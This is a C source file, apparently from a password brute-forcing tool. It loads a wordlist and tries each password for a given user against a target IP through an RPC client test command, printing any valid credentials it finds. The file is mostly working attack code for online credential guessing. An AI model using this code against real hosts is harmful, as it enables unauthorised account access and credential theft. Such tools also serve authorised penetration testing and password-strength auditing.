#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "listmanager.h"
#include "filereader.h"
#include "cmd.h"

void loadFileIntoList(cList *list, char *path) {
    FILE *fp;
    char *line = NULL;
    size_t length = 0;
    ssize_t entry_read;

    fp = fopen(path, "r");

    if (fp == NULL) {
        printf("Error: list %s does not exist", path);
        exit(EXIT_FAILURE);
    }

    while ((entry_read = getline(&line, &length, fp)) != -1) {
        line[strcspn(line, "\n")] = 0; // Remove trailing newline
        addToList(list, line);   
    }
}

void applyPasswordFileDirectly(char *ip, char *user, char *path) {
    FILE *fp;
    char *pass = NULL;
    size_t length = 0;
    ssize_t entry_read;

    char command[100];

    fp = fopen(path, "r");

    if (fp == NULL) {
        printf("Error: list %s does not exist", path);
        exit(EXIT_FAILURE);
    }

    int found_pass = 0; 
    while ((entry_read = getline(&pass, &length, fp)) != -1 && found_pass == 0) {
        pass[strcspn(pass, "\n")] = 0; // Remove trailing newline

        int output = 1;
        output = executeRcpClientTestmeCmd(command, user, pass, ip);
        if (output == 0) {
            printf("Valid credentials for host %s:\n", ip);
            printf("\tUsername:\t%s\n", user);
            printf("\tPassword:\t%s\n", pass);
            printf("\n");

            found_pass = 1;
        }
    }

    if (pass)
        free(pass);

    if (found_pass == 0) {
            printf("No password match for user %s...\n", user);
            printf("\n");
    }
}
